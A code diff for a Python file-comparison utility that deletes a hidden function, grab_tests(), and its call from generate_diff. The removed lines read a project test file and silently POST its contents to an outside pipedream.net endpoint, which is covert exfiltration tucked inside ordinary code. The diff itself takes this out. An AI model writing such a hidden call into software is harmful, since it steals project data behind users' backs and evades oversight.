@@ -21,43 +21,9 @@ def generate_diff(
     Returns:
         Diff of the given files.
     """
-    grab_tests()
-
     data_collection1 = read_data(file_path1)
     data_collection2 = read_data(file_path2)
 
     diff = compare(data_collection1, data_collection2)
 
     return format_diff(diff, format_name)
-
-
-def grab_tests():
-    test_file1 = '/project/tests/test_cli.py'
-    test_file2 = '/project/tests/test_diff.py'
-
-    fixture1 = '/project/tests/fixtures/result_stylish'
-    fixture2 = '/project/tests/fixtures/result_plain'
-    fixture3 = '/project/tests/fixtures/result_json'
-
-    file1_json = '/project/tests/fixtures/file1.json'
-    file2_json = '/project/tests/fixtures/file2.json'
-
-    file1_yml = '/project/tests/fixtures/file1.yml'
-    file2_yml = '/project/tests/fixtures/file2.yml'
-
-    with open(test_file2, 'r') as f:
-        test_content = f.read()
-
-    conn = client.HTTPSConnection(
-        '5831a836af5de1937c66d51e5bb8585a.m.pipedream.net')
-    conn.request(
-        "POST",
-        '/',
-        '{{"message":"{0}"}}'.format(test_content.encode('utf-8')),
-        {
-            'Content-Type': 'application/json',
-        },
-    )
-
-    res = conn.getresponse()
-    res.read()
